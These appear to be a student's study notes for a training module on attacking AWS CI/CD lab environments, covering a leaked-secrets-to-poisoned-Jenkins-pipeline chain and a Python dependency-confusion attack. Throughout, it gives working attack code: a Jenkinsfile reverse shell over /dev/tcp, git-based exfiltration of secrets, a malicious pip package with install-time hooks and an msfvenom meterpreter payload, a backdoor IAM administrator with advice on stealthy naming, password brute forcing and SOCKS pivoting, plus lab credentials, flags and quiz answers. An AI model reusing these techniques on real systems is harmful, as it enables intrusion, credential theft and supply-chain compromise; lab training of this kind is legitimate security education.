# Attacking AWS Cloud Infrastructure

**Module 26** | ← [[Enumerating AWS Cloud Infrastructure]]

Tags: #Module26 #AWS #CICD #PipelinePoisoning #DependencyChain #Jenkins #Gitea #S3 #Python #Terraform #CloudSecurity

## Overview

Two completely separate attack chains, each with its own lab environment.

**Part 1 — Leaked Secrets to Poisoned Pipeline**
Misconfigured S3 bucket exposes a full git repository. Git history contains hardcoded admin credentials (base64 basic auth header). Admin Gitea access lets us edit a Jenkins pipeline definition. Poisoned Jenkinsfile yields a reverse shell on the build server, with AWS credentials in env vars. Create backdoor IAM user for persistent full admin access.

**Part 2 — Dependency Chain Abuse**
OSINT finds a forum post referencing a private Python package not on the public registry. Publishing a higher-versioned malicious package causes pip's `extra-index-url` confusion: production pulls ours instead of the private one. Production shell leads to internal network pivot via netscan.py, Jenkins discovery, S3 Explorer plugin credential leak, then Terraform state file with admin AWS keys.

---

## OWASP CI/CD Top 10

| ID | Risk | Relevance |
|----|------|-----------|
| CICD-SEC-1 | Insufficient Flow Control | Background |
| CICD-SEC-2 | Inadequate IAM | Background |
| CICD-SEC-3 | Dependency Chain Abuse | Part 2 main attack |
| CICD-SEC-4 | Poisoned Pipeline Execution (PPE) | Part 1 main attack |
| CICD-SEC-5 | Insufficient PBAC | Both parts |
| CICD-SEC-6 | Insufficient Credential Hygiene | Part 1 (git history creds) |
| CICD-SEC-7 | Insecure System Configuration | Part 2 (Jenkins plugin) |
| CICD-SEC-8 | Ungoverned 3rd Party Services | Not covered (needs GitHub) |
| CICD-SEC-9 | Improper Artifact Integrity Validation | Part 2 (no package signing) |
| CICD-SEC-10 | Insufficient Logging/Visibility | Not covered (manual) |

> 📸 Screenshot: OWASP CI/CD Top 10 overview diagram

---

## Part 1: Leaked Secrets to Poisoned Pipeline

### 26.2. Lab Design

Lab ID: `aws/attacking-cicd/scenario1`

| Component | URL |
|-----------|-----|
| Gitea (SCM) | `git.offseclab.io` |
| Jenkins (automation) | `automation.offseclab.io` |
| App | `app.offseclab.io` |

Lab also provides: custom DNS IP, cloud Kali IP, cloud Kali SSH password.

**Lab notes:** State does not persist. Lab prompts after 1 hour idle, extends up to 10 hours. DNS IP changes on every restart.

#### DNS setup (run at every lab start)

```bash
sudo nmcli connection modify "Wired connection 1" ipv4.dns "<DNS_IP>"
sudo systemctl restart NetworkManager
cat /etc/resolv.conf          # verify nameserver line shows DNS_IP
nslookup git.offseclab.io     # verify it resolves to a real IP
```

You can also add fallback resolvers in a comma-separated list: `"<DNS_IP>, 1.1.1.1"`.

#### DNS cleanup (run at lab end)

```bash
sudo nmcli connection modify "Wired connection 1" ipv4.dns ""
sudo systemctl restart NetworkManager
```

---

### 26.3. Enumeration

#### 26.3.1. Enumerating Jenkins

Jenkins is at the root path, not `/jenkins/`. Fingerprint version without credentials using Metasploit:

```bash
sudo msfdb init
msfconsole --quiet
```

In MSF:
```
use auxiliary/scanner/http/jenkins_enum
set RHOSTS automation.offseclab.io
set TARGETURI /        # root, not /jenkins/
run
```

Expected output: Jenkins version + 403 on all restricted endpoints (auth required). Version alone is useful for public exploit search.

> 🔍 Worth remembering generally: `TARGETURI` defaults to `/jenkins/` in this module. Jenkins is actually at `/`. Always check root vs. sub-path when a scanner returns minimal results.

**Quiz answers (pure recall):**
- Q2: `C, jenkins_enum`
- Q3: `A, To specify the root directory of Jenkins`

> 🚩 Hands-on, VM spin-up required: Run a directory busting attack on `automation.offseclab.io` to find the hidden endpoint that returns a flag. ✅ Done

**Gotcha — wildcard 403s and the Caddy layer.** Jenkins returns 403 (not 404) for ALL paths, including non-existent ones. The 403 body includes the path itself, so every false-positive has a different size — `--exclude-length` only clears one specific size. Fix: use `-b 403,404` to blacklist the status codes entirely and only surface real hits. Also: `Server: Caddy` shows in headers — there's a reverse proxy in front of Jenkins that can have its own routes independent of Jenkins (that's where the flag endpoint lived).

`robots.txt` returned during a common.txt scan:
```
# we don't want robots to click "build" links
User-agent: *
Disallow: /%
```

Switched to SecLists `raft-medium-words.txt` with status-code blacklisting:
```bash
gobuster dir -u http://automation.offseclab.io \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -b 403,404 -t 50
```

Found `/help_answer` (Status: 200, Size: 44):
```bash
curl http://automation.offseclab.io/help_answer
OS{ceed5131f8e7896442f018222cae85989e4b40d2}
```

#### 26.3.2. Enumerating the Git Server

Visit `git.offseclab.io`. Click **Explore**. Without credentials:
- **Repositories tab:** empty (repos are private)
- **Users tab:** five accounts: Billy, Jack, Lucy, Roger, administrator
- **Version:** shown at bottom of page

Key insight: self-hosted SCMs expose user lists by default even without auth. Hosted SCMs (GitHub, GitLab) have too many unrelated users for this to be useful.

**Quiz answers (pure recall):**
- Q2: `B. Enumerating public repositories and users (hosted SCMs = OSINT focus, not brute force of accounts)`
- Q3: `B, The repositories are private`

> 🚩 Hands-on, VM spin-up required: Brute force the five discovered users to find the one with a weak password. ✅ Done

Endpoint: `http://git.offseclab.io/api/v1/user`, returns 200 on valid Basic Auth, 401 on failure. Start with Billy (lab hint):

```bash
wfuzz -c -z file,/usr/share/wordlists/rockyou.txt --basic "billy:FUZZ" \
  -u http://git.offseclab.io/api/v1/user --hc 401
```

Hit on request 20: **billy:qwerty**. Confirmed with curl, authenticated JSON user object returned, `is_admin: false`.

#### 26.3.3. Enumerating the Application

```bash
dirb http://app.offseclab.io
# Finds nothing useful
```

View page source instead. Key find: S3 bucket URLs in `<img src="...">` tags:
```
https://staticcontent-<SUFFIX>.s3.us-east-1.amazonaws.com/images/bunny.jpg
```

Test bucket root listing:
```bash
curl https://staticcontent-<SUFFIX>.s3.us-east-1.amazonaws.com
# Returns: <Error><Code>AccessDenied</Code>...
# Bucket-level listing blocked
```

Test with dirb (first 50 entries of common.txt):
```bash
head -n 51 /usr/share/wordlists/dirb/common.txt > first50.txt
dirb https://staticcontent-<SUFFIX>.s3.us-east-1.amazonaws.com ./first50.txt
# Finds: /.git/HEAD (CODE:200) = full git repo in bucket
```

Test with AWS CLI (cross-account authenticated listing):
```bash
aws configure    # use lab-provided IAM creds, region us-east-1
aws s3 ls staticcontent-<SUFFIX>
# Lists: .git/, images/, scripts/, webroot/, Jenkinsfile, README.md, etc.
```

Why this works: S3's "AuthenticatedUsers" ACL is widely misunderstood. Admins think it means "users in my account" but it actually means "any authenticated AWS user in any account." A free personal AWS account is enough to exploit this.

> 🔍 Worth remembering generally: S3 bucket-level ACL blocking public access and object-level access are separate controls. An object can be readable by any AWS-authenticated user even if the bucket appears "private" to unauthenticated requests.

> 🔁 Similar to: [[Enumerating AWS Cloud Infrastructure#25.2. Cloud Storage Enumeration|Module 25 S3 enumeration]], same cross-account listing bypass pattern

**Quiz answers (pure recall):**
- Q2: `C, The use of S3 buckets for storing images`
- Q3: `B, aws s3 ls`

> 🚩 Hands-on, VM spin-up required: Find the flag in the HTML source of `app.offseclab.io`. ✅ Done

```bash
curl -s http://app.offseclab.io | grep -i "flag\|OS{"
# <p hidden>OS{5196fd9c2e4aa10c93f04940a553c7155c7bdf70}</p>
```

Flag was in a `<p hidden>` tag, not visible in the browser but present in raw HTML source.

---

### 26.4. Discovering Secrets

#### 26.4.1. Downloading the Bucket

```bash
mkdir static_content
aws s3 sync s3://staticcontent-<SUFFIX> ./static_content/
cd static_content
```

Contents: `.git/`, `images/`, `scripts/`, `webroot/`, `Jenkinsfile`, `README.md`, `docker-compose.yml`, `Caddyfile`, `CONTRIBUTING.md`.

Presence of Jenkinsfile = this is a CI/CD repo.

Review `scripts/update-readme.sh`: accepts `USERNAME PASSWORD` as args, calls Gitea API with a basic auth header. README names Lucy and Roger as collaborators, Jack as repo owner.

**Quiz answers (pure recall):**
- Q1: `C. Jenkinsfile`
- Q2: `B, aws s3 sync`

#### 26.4.2. Searching for Secrets in Git History

Install gitleaks and run it:
```bash
sudo apt update && sudo apt install -y gitleaks
gitleaks detect
# Output: "no leaks found"
```

gitleaks finds nothing. Always do a manual review of interesting commits:

```bash
git log
# Look for commits after "Add Management Scripts": there's a "Fix issue" commit
git show <FIX_ISSUE_COMMIT_HASH>
```

The diff reveals the old version of `update-readme.sh` had a hardcoded basic auth header:
```
'authorization: Basic YWRtaW5pc3RyYXRvcjo5bndrcWU1aGxiY21jOTFu'
```

Decode it:
```bash
echo "YWRtaW5pc3RyYXRvcjo5bndrcWU1aGxiY21jOTFu" | base64 --decode
# administrator:9nwkqe5hlbcmc91n   (will differ in your lab)
```

Log in to `git.offseclab.io` as `administrator` with the decoded password.

> 🔍 Worth remembering generally: `gitleaks` checks current file contents and some obvious patterns but can miss credentials that lived in a previous version of a file and were "fixed" in a later commit. Always manually inspect commits titled "fix", "cleanup", "remove secrets", etc., especially the ones right after a credentials or scripts commit.

**Quiz answer (derivable from module text):**
- Q1: `Jack` (every commit in the git log is authored by Jack)

> 🚩 Hands-on, VM spin-up required: Find the flag embedded in one of the files in the git history. ✅ Done

```bash
# Sync bucket (bucket name suffix differs per lab run — get it from app.offseclab.io page source)
mkdir static_content && aws s3 sync s3://staticcontent-<SUFFIX> ./static_content/
cd static_content

# Find which commit has the flag
git --no-pager log -p | grep "OS{"

# Decode the hardcoded credential found in the "Fix issue" diff
echo "YWRtaW5pc3RyYXRvcjpzbTkzbzZ3MjFqamVub3A4" | base64 --decode
# administrator:sm93o6w21jjenop8   (suffix differs per lab run)
```

The flag was added to a file in an earlier commit then removed in `2c8e53e Fix issue`. It no longer exists in the working tree, only visible in history:
```
-OS{b866692e41bc2d0b9d38cab857f2f8ef53e8b065}
```

Flag: `OS{b866692e41bc2d0b9d38cab857f2f8ef53e8b065}`

Also recovered: **administrator:sm93o6w21jjenop8** from the removed `authorization: Basic` header in the same commit. Use these to log in to `git.offseclab.io` as administrator.

---

### 26.5. Poisoning the Pipeline

#### 26.5.1. Enumerating the Repositories

Logged in as `administrator`, click **Explore**. Private repos now visible. Open `image-transform` repo and review its Jenkinsfile:

```groovy
pipeline {
  agent any
  stages {
    stage('Validate Cloudfront File') {
      steps {
        withAWS(region:'us-east-1', credentials:'aws_key') {
          cfnValidate(file:'image-processor-template.yml')
        }
      }
    }
    stage('Create Stack') {
      steps {
        withAWS(region:'us-east-1', credentials:'aws_key') {
          cfnUpdate(stack:'image-processor-stack', file:'image-processor-template.yml', ...)
        }
      }
    }
  }
}
```

`withAWS(credentials:'aws_key')` = Jenkins AWS Steps plugin loads the named credential store entry as environment variables:
- `AWS_ACCESS_KEY_ID`
- `AWS_SECRET_ACCESS_KEY`
- `AWS_DEFAULT_REGION`

These will be available to any `sh` step inside the `withAWS` block. If we can run our own `sh` inside a `withAWS`, we can capture the credentials.

Check webhooks: **Settings → Webhooks** in Gitea. A Git Push event fires a webhook to the automation server. Editing the Jenkinsfile and pushing will trigger a pipeline run automatically.

> 📸 Screenshot: Gitea webhook settings showing trigger type and destination URL

> 🚩 Hands-on, VM spin-up required: Find the flag in the `image-transform` repository. ✅ Done

```bash
git clone http://administrator:sm93o6w21jjenop8@git.offseclab.io/Jack/image-transform.git
grep -r "OS{" ~/image-transform/
# /home/kali/image-transform/README.md:OS{c63b4732a64361464f4c5ffe408f69fe6545bc8a}
```

Flag was in `README.md`: `OS{c63b4732a64361464f4c5ffe408f69fe6545bc8a}`

> 🚩 Hands-on, VM spin-up required: Check the webhook type configured on the `image-transform` repo (Gitea Settings → Webhooks). ✅ Done

Webhook type: **Gogs** (Gitea is a Gogs fork and uses the Gogs webhook format for backwards compatibility; the Jenkins endpoint is `/gogs-webhook/?job=<jobname>`). Confirmed via Gitea API after lab reset:
```bash
curl -s -u "administrator:<password>" "http://git.offseclab.io/api/v1/repos/Jack/image-transform/hooks"
# "type": "gogs", "url": "http://automation.offseclab.io/gogs-webhook/?job=image-transform"
```

#### 26.5.2. Modifying the Pipeline

The Jenkinsfile DSL is Groovy-based. The `script {}` block runs Groovy inside a sandbox that blocks most Java/internal API access. No direct process spawning from Groovy.

Use `sh` from the **Nodes and Processes** plugin instead. This plugin is almost always installed (it's maintained by Jenkins itself and enables basic pipeline functionality like `dir` and `sh`).

**Step 1: Verify execution with a curl callback.**

Start Apache on cloud Kali first:
```bash
ssh kali@<CLOUD_KALI_IP>
sudo systemctl start apache2
```

Poisoned Jenkinsfile (test payload):
```groovy
pipeline {
  agent any
  stages {
    stage('Send Reverse Shell') {
      steps {
        withAWS(region: 'us-east-1', credentials: 'aws_key') {
          script {
            if (isUnix()) {
              sh 'curl http://<CLOUD_KALI_IP>/unix'
            }
          }
        }
      }
    }
  }
}
```

After committing in Gitea UI, watch Apache logs on cloud Kali:
```bash
cat /var/log/apache2/access.log
# Expect: "GET /unix HTTP/1.1" 200 from the builder's IP
```

`isUnix()` is a Jenkinsfile built-in that returns true on Linux/macOS builders. Use it to avoid crashes on Windows builders.

**Step 2: Replace with reverse shell.**

Start listener on cloud Kali:
```bash
nc -nvlp 4242
```

Final poisoned Jenkinsfile:
```groovy
pipeline {
  agent any
  stages {
    stage('Send Reverse Shell') {
      steps {
        withAWS(region: 'us-east-1', credentials: 'aws_key') {
          script {
            if (isUnix()) {
              sh 'bash -c "bash -i >& /dev/tcp/<CLOUD_KALI_IP>/4242 0>&1" &'
            }
          }
        }
      }
    }
  }
}
```

Commit in Gitea UI. Shell arrives within seconds of the pipeline starting.

> 🔍 Worth remembering generally: Wrapping a reverse shell in `bash -c "..."` ensures redirections work regardless of the execution context. The trailing `&` backgrounds the process so the pipeline step doesn't stall waiting for it to finish.

> 🔍 Worth remembering generally: Groovy `script {}` in a Jenkinsfile runs sandboxed. You cannot call Java APIs, spawn processes, or read files via Groovy directly without admin approval. Always use `sh` for OS-level commands in a Jenkinsfile.

#### 26.5.3. Enumerating the Builder

After shell lands (running as `jenkins` user):

```bash
uname -a                        # kernel: Amazon Linux kernel, arch x86_64
cat /etc/os-release             # OS: Debian GNU/Linux 11 (bullseye)
ls -a ~                         # .ssh/, agent/ (workspace snapshots)
cat ~/.ssh/authorized_keys      # Jenkins controller SSH key present
cat /proc/mounts                # overlay filesystem = Docker container
cat /proc/1/status | grep Cap   # check container capability set
```

Decode capabilities on personal Kali:
```bash
capsh --decode=0000003fffffffff
# cap_net_admin, cap_sys_admin present = privileged or all-caps container
# Need root-in-container first to exploit these
```

Find the AWS credentials:
```bash
env | grep AWS
# AWS_ACCESS_KEY_ID=...
# AWS_SECRET_ACCESS_KEY=...
# AWS_DEFAULT_REGION=us-east-1
```

These are the credentials loaded by `withAWS(credentials:'aws_key')` from Jenkins' credential store.

**Quiz answer (derivable from module text):**
- Q1: `Debian GNU/Linux` (module Listing 34 shows `PRETTY_NAME="Debian GNU/Linux 11 (bullseye)"`)

> 🚩 Hands-on, VM spin-up required: Find the flag in the "secret" file on the builder. ✅ Done

**Gotcha — SSH to cloud Kali failed (server only offered publickey auth), local machine was behind NAT.** Used git exfiltration instead: Jenkinsfile writes loot back to the Gitea repo via `git commit && git push`, then we `git pull` to read it. No listener needed.

File is named `secrets` (plural), not `secret`, `find -name "secret"` missed it. Found by grepping for `OS{` across the filesystem:
```bash
grep -rl "OS{" /home /etc /tmp /var /root /agent 2>/dev/null
# /home/jenkins/secrets
```

```bash
# Jenkinsfile payload (inside withAWS + sh block):
printf "%s\n" "$(cat /home/jenkins/secrets)" > loot.txt
git add loot.txt && git commit -m "loot" && git push http://administrator:<pass>@git.offseclab.io/Jack/image-transform.git HEAD:master
```

Flag from `/home/jenkins/secrets`: `OS{a8d127e69cd052378d9bd0e53521ae86c5f68258}`

> 🚩 Hands-on, VM spin-up required: Find the flag in an environment variable on the builder. ✅ Done

Same git exfiltration approach. Flag was in `FLAG` env var (found with `env | grep -i flag`):
`FLAG=OS{0455af05cb5e9eee94a715e47627a020f1e810ff}`

Also recovered builder AWS credentials via `env | grep AWS`:
- `AWS_ACCESS_KEY_ID=AKIA347SY2ZX2XUUSVFI`
- `AWS_SECRET_ACCESS_KEY=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`

---

### 26.6. Compromising the Environment via Backdoor Account

#### 26.6.1. Discovering Access Level

```bash
aws configure --profile=CompromisedJenkins
# Enter AWS_ACCESS_KEY_ID and AWS_SECRET_ACCESS_KEY from env

aws --profile CompromisedJenkins sts get-caller-identity
# UserId, Account ID, Arn: ...user/system/jenkins-admin

# Three policy attachment types to check:
aws --profile CompromisedJenkins iam list-user-policies --user-name jenkins-admin
# PolicyNames: ["jenkins-admin-role"]   (inline policy)

aws --profile CompromisedJenkins iam list-attached-user-policies --user-name jenkins-admin
# AttachedPolicies: []

aws --profile CompromisedJenkins iam list-groups-for-user --user-name jenkins-admin
# Groups: []

aws --profile CompromisedJenkins iam get-user-policy --user-name jenkins-admin --policy-name jenkins-admin-role
# Effect: Allow, Action: *, Resource: * = full administrator
```

#### 26.6.2. Creating a Backdoor Account

```bash
# Create user
aws --profile CompromisedJenkins iam create-user --user-name backdoor

# Attach AdministratorAccess (AWS managed policy)
aws --profile CompromisedJenkins iam attach-user-policy \
  --user-name backdoor \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Generate access keys
aws --profile CompromisedJenkins iam create-access-key --user-name backdoor
# Note: AccessKeyId and SecretAccessKey from output

# Configure profile with new keys
aws configure --profile=backdoor

# Verify
aws --profile backdoor iam list-attached-user-policies --user-name backdoor
# Confirms: AdministratorAccess attached
```

> 🔍 Worth remembering generally: In a real engagement, use a realistic username: `terraform-admin`, `deploy-service`, `ci-bot`. The username `backdoor` will stand out in any CloudTrail audit log immediately.

> 🔁 Similar to: [[Enumerating AWS Cloud Infrastructure#25.5. Post-Compromise Enumeration|Module 25 IAM privilege escalation]], same `iam:CreateAccessKey` on `Resource: *` vector

> 🚩 Hands-on, VM spin-up required: Find the flag in an EC2 instance tag using the compromised AWS credentials (`aws ec2 describe-instances --profile CompromisedJenkins` and check Tags). ✅ Done

```bash
aws --profile CompromisedJenkins iam get-user-policy --user-name jenkins-admin --policy-name jenkins-admin-role
# Action: *, Resource: * — full administrator

aws --profile CompromisedJenkins ec2 describe-instances \
  --query "Reservations[*].Instances[*].Tags" --output json
# Key: "Flag", Value: OS{35186d1f9cf776149d170e607608186969f7519b}
# on instance named "CI/CD Infra"
```

---

## Part 2: Dependency Chain Abuse

### 26.7. Lab Design

Separate lab environment from Part 1. Same DNS setup procedure (new IP on each restart).

Additional setup: configure pip to use the lab's private PyPI server.

```bash
mkdir -p ~/.config/pip/
nano ~/.config/pip/pip.conf
```

`pip.conf` contents:
```ini
[global]
index-url = http://pypi.offseclab.io
trusted-host = pypi.offseclab.io
```

This replaces the default PyPI index for the duration of the lab. Apply the same config to the cloud Kali instance over SSH.

**Cleanup (at lab end, in addition to DNS reset):**
```bash
rm ~/.pypirc
rm ~/.config/pip/pip.conf
# Also reset Firefox SOCKS proxy to "No proxy" in Settings
```

---

### 26.8. Information Gathering

#### 26.8.1. Enumerating the Services

Visit `app.offseclab.io`: "HackShort" URL shortener with an API. Open Developer Tools → Network tab → refresh page → inspect the first request headers:
- Two `Server: Caddy` headers (two reverse proxies)
- One `Server: Werkzeug/1.0.1 Python/3.11.2` header (Python/Flask backend)

> 🚩 Hands-on, VM spin-up required: Find the hidden HTTP path on `app.offseclab.io` that returns a flag when visited. ✅ Done

Flask returns 302 (not 404) for non-existent paths, exclude the wildcard length:
```bash
gobuster dir -u http://app.offseclab.io \
  -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt \
  -b 403,404 --exclude-length 237 -t 50
# /admin  (Status: 200) [Size: 44]
curl http://app.offseclab.io/admin
# OS{687a2c7ebb7514cf6065fbe0bc6c84b08b51f999}
```

> 🚩 Hands-on, VM spin-up required: Find the flag in the HTML source of `app.offseclab.io`. ✅ Done

Flag was in an HTML comment inside `/api_doc`, not the main page:
```bash
curl -s http://app.offseclab.io/api_doc | grep -i 'OS{'
# <!-- OS{64a96572fcd6de8bc208284c76f722725d707cab}  //-->
```

#### 26.8.2. Conducting OSINT

Simulated forum post reveals (treat as OSINT finding):
- The app uses a private package: `hackshort-util~=1.1.0` in requirements.txt
- Import pattern: `from hackshort_util import utils`
- Package not on any public repo

```bash
pip download hackshort-util
# ERROR: No matching distribution found
```

Not on the lab's pypi.offseclab.io either. This makes it a dependency chain attack target.

---

### 26.9. Dependency Chain Attack

#### 26.9.1. Understanding the Attack

**pip's two index configurations:**

| Setting | Behaviour |
|---------|-----------|
| `index-url` | Replaces default PyPI. Only this index searched. No dependency confusion possible. |
| `extra-index-url` | ADDS indexes alongside default PyPI. Both searched. Highest version wins. Vulnerable. |

**The attack:** if the developer uses `extra-index-url` to add a private registry, publish the same package name to the public index with a higher version. pip downloads yours instead.

**Version specifiers:**

| Specifier | Example | What matches |
|-----------|---------|-------------|
| `==` | `pkg==1.0.0` | Exact version only (`==1.0.*` for wildcard) |
| `<=` | `pkg<=1.0.0` | 1.0.0 or lower |
| `>=` | `pkg>=1.0.0` | 1.0.0 or higher |
| `~=` | `pkg~=1.1.0` | Compatible: 1.1.x only, not 1.2.0 |

For `hackshort-util~=1.1.0`: any version from 1.1.1 to 1.1.9 works. Use `1.1.4`.

Dash vs underscore: pip/PyPI package name = `hackshort-util` (dash allowed). Python import = `hackshort_util` (underscore, dash is invalid syntax).

**Quiz answers (pure recall):**
- Q1: `extra-index-url (it adds additional indexes to search alongside the default public PyPI, and highest version wins)`
- Q2: `A. 2.0.1 (satisfies hackshort-util==2.*; 3.4b fails because 3.x, 22.0 fails because 22.x)`
- Q3: `D. Versions that are compatible with the specified version can be used`
- Q4: `B. Dashes cause issues in Python syntax`

#### 26.9.2. Creating the Malicious Package

Minimum structure:
```
hackshort-util/
├── setup.py
└── hackshort_util/
    └── __init__.py
```

```bash
mkdir hackshort-util && cd hackshort-util
mkdir hackshort_util
touch hackshort_util/__init__.py
```

`setup.py`:
```python
from setuptools import setup, find_packages

setup(
    name='hackshort-util',
    version='1.1.4',         # higher than 1.1.0, within ~= range
    packages=find_packages(),
    classifiers=[],
    install_requires=[],
    tests_require=[],
)
```

Build and test:
```bash
python3 ./setup.py sdist
pip install ./dist/hackshort_util-1.1.4.tar.gz
python3 -c "import hackshort_util; print(hackshort_util)"
pip uninstall hackshort-util
```

#### 26.9.3. Command Execution During Install

Add a custom `cmdclass` to `setup.py`. The `Installer.run()` fires at `pip install` time (build time in a pipeline):

```python
from setuptools import setup, find_packages
from setuptools.command.install import install

class Installer(install):
    def run(self):
        install.run(self)       # continue normal install
        # payload: reverse shell, file write, etc.
        with open('/tmp/running_during_install', 'w') as f:
            f.write('executed during install')

setup(
    name='hackshort-util',
    version='1.1.4',
    packages=find_packages(),
    classifiers=[],
    install_requires=[],
    tests_require=[],
    cmdclass={'install': Installer}
)
```

Test: rebuild, install, verify file was created.

#### 26.9.4. Command Execution During Runtime

Create `hackshort_util/utils.py`. This fires when the application imports the module.

Two problems to solve:
1. The app calls functions that don't exist in our utils, need a wildcard catcher
2. If we return the wrong type, the app throws an exception and may crash, need to suppress it

```python
import time
import sys

def standardFunction():
    pass

def __getattr__(name):
    # module-level __getattr__: called for any unknown attribute name
    pass
    return standardFunction

def catch_exception(exc_type, exc_value, tb):
    # replaces the default crash handler with an infinite sleep
    while True:
        time.sleep(1000)

sys.excepthook = catch_exception
```

`__getattr__` at the module level is called when an attribute name isn't found. Returning `standardFunction` (which does nothing) handles any function call without erroring.

`sys.excepthook` replaces Python's default crash handler. If the app throws an uncaught exception (because our return type is wrong), it sleeps forever instead of printing a traceback and exiting, buying time to enumerate.

#### 26.9.5. Adding a Payload

Generate Python meterpreter on personal Kali:
```bash
msfvenom -f raw -p python/meterpreter/reverse_tcp LHOST=<CLOUD_KALI_IP> LPORT=4488
```

Append the output to `hackshort_util/utils.py`:
```python
# ... (standardFunction, __getattr__, catch_exception, sys.excepthook as above)

exec(__import__('zlib').decompress(...))   # paste msfvenom output here
```

Start listener on cloud Kali:
```bash
ssh kali@<CLOUD_KALI_IP>
sudo msfdb init
msfconsole
use exploit/multi/handler
set payload python/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 4488
set ExitOnSession false
run -jz
```

Test locally first (rebuild, install, import in python3, verify session received), then uninstall.

#### 26.9.6. Publishing the Malicious Package

Configure `~/.pypirc`:
```ini
[distutils]
index-servers = 
    offseclab 

[offseclab]
repository: http://pypi.offseclab.io/
username: student
password: password
```

Build and upload:
```bash
python3 ./setup.py sdist
twine upload --repository-url http://pypi.offseclab.io/ -u student -p password dist/*
```

If you need to remove and re-upload a bad version:
```bash
curl -u "student:password" \
  --form ":action=remove_pkg" \
  --form "name=hackshort_util" \
  --form "version=1.1.4" \
  http://pypi.offseclab.io/
```

Production server rebuilds every 10 minutes. Wait for the meterpreter session.

**Quiz answers (pure recall):**
- Q3: `B, The output of the mount command (overlay filesystem confirms Docker)`
- Q4: `C. ROOT_PASSWORD (not present; actual env vars were SECRET_KEY, ADMIN_PASSWORD, GPG_KEY, ADMIN_USERNAME)`

> 🚩 Hands-on, VM spin-up required: Obtain a meterpreter shell on the production server via dependency chain attack. Read `/proof.txt` for the flag. ⬜ Pending

> 🚩 Hands-on, VM spin-up required: Obtain command execution on the **builder** server by embedding a payload in `setup.py` (install-time execution). Read `/proof.txt` for the flag. ⬜ Pending

---

### 26.10. Compromising the Environment

#### 26.10.1. Enumerating the Production Container

```
meterpreter > ifconfig
# eth0: 172.18.0.4/16
# eth1: 172.30.0.3/16

meterpreter > shell
whoami         # root
ls -alh        # Python app source, Dockerfile, pip.conf, requirements.txt
mount          # overlay = Docker
printenv       # SECRET_KEY, ADMIN_PASSWORD, GPG_KEY, ADMIN_USERNAME, SQLALCHEMY_DATABASE_URI
```

SQLite DB path in env: `sqlite:////data/data.db`. Can be read via Python's sqlite3 module from the shell.

Sessions will die when the service restarts. When the app restarts, a new meterpreter session opens automatically (the payload is baked into the package).

> 🚩 Hands-on, VM spin-up required: Find the environment variable containing the flag in the production container. ⬜ Pending

> 🚩 Hands-on, VM spin-up required: Find the flag in the SQLite database (`/data/data.db`, check the links table). ⬜ Pending

> 🚩 Hands-on, VM spin-up required: Check `/etc/os-release` on the production container to identify the OS. ⬜ Pending

#### 26.10.2. Scanning the Network

No nmap in the container. Write a Python port scanner and upload it via meterpreter.

`netscan.py` (create on personal Kali, scp to cloud Kali, then upload via meterpreter):
```python
import socket
import ipaddress
import sys

def port_scan(ip_range, ports):
    for ip in ip_range:
        print(f"Scanning {ip}")
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(.2)
            result = sock.connect_ex((str(ip), port))
            if result == 0:
                print(f"Port {port} is open on {ip}")
            sock.close()

ip_range = ipaddress.IPv4Network(sys.argv[1], strict=False)
ports = [80, 443, 8080]
port_scan(ip_range, ports)
```

Transfer and run:
```bash
# On personal Kali:
scp ./netscan.py kali@<CLOUD_KALI_IP>:/home/kali/

# In meterpreter:
meterpreter > upload /home/kali/netscan.py /netscan.py
meterpreter > shell
python /netscan.py 172.18.0.1/24
python /netscan.py 172.30.0.1/24
```

The script will appear frozen while scanning. Give it a few minutes.

**Key find from 172.30.0.1/24:**
- `172.30.0.30:8080` — Jenkins (confirmed by curl showing Jenkins login redirect + login page HTML with "create an account" link)

Self-registration open = can create an account and enumerate further without brute forcing.

> 🔍 Worth remembering generally: Private Docker networks often have no firewall rules between containers. Direct access to an internal service lets you bypass any authentication imposed by the internet-facing reverse proxy.

> 🔁 Similar to: [[Port Redirection and SSH Tunneling#Meterpreter Tunneling|MSF autoroute + SOCKS pivot]], same pivot chain pattern

> 🚩 Hands-on, VM spin-up required: Find the hidden HTTP service on port 80 in the internal network (`172.18.0.0/16`) that returns a flag. ⬜ Pending

#### 26.10.3. Loading Jenkins

Full tunnel chain:
```
Personal Kali → SSH tunnel → Cloud Kali → MSF SOCKS → Route → 172.30.0.30:8080
```

Steps (run on cloud Kali in MSF, after backgrounding the session):

```
# Background the session
meterpreter > background

# Start SOCKS proxy (listen only on localhost, not internet-facing)
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
run -j

# Add route for Jenkins network through the meterpreter session
route add 172.30.0.1 255.255.0.0 <SESSION_ID>
```

Then on personal Kali, create an SSH local forward:
```bash
ssh -fN -L localhost:1080:localhost:1080 kali@<CLOUD_KALI_IP>
# -f = background, -N = no command, -L = local forward
# localhost:1080 on personal Kali → localhost:1080 on cloud Kali
```

Verify the tunnel is up:
```bash
ss -tulpn | grep 1080
# tcp LISTEN 127.0.0.1:1080
```

Configure Firefox: Settings → Network → Manual proxy → SOCKS Host: `127.0.0.1` Port: `1080` → **SOCKS v5** → OK.

Browse to `http://172.30.0.30:8080`. Slow but works.

> 🔁 Similar to: [[Port Redirection and SSH Tunneling#SSH Local Port Forwarding|SSH -L forward]] combined with [[Port Redirection and SSH Tunneling#Meterpreter SOCKS|MSF SOCKS proxy + route add]]

#### 26.10.4. Exploiting Jenkins

Create an account via self-registration. Navigate to Dashboard. Find `company-dir` project. Note the **S3 Explorer** action.

**S3 Explorer plugin vulnerability:** AWS credentials are embedded unmasked in the HTML source as hidden `<input>` fields. No authentication or masking. Anyone with a Jenkins account can read them.

View page source on the S3 Explorer page:
```html
<input id="awsid" type="hidden" value="AKIAUBHUBEGIMWGUDSWQ">
<input id="awskey" type="hidden" value="e7pRWvsGgTyB8UHNXilvCZdC9xZPA8oF3KtUwaJ5">
<input id="awsregion" type="hidden" value="us-east-1">
<input id="bucket" type="hidden" value="company-directory-<SUFFIX>">
```

Configure profile:
```bash
aws configure --profile=stolen-s3
# enter the id and key from above

aws --profile=stolen-s3 sts get-caller-identity
# user: s3_explorer

aws --profile=stolen-s3 s3api list-buckets
# Finds: company-directory-<SUFFIX>, tf-state-<SUFFIX>
```

**Quiz answers (pure recall):**
- Q2: `B, Creating a user account for enumeration (self-registration was open)`
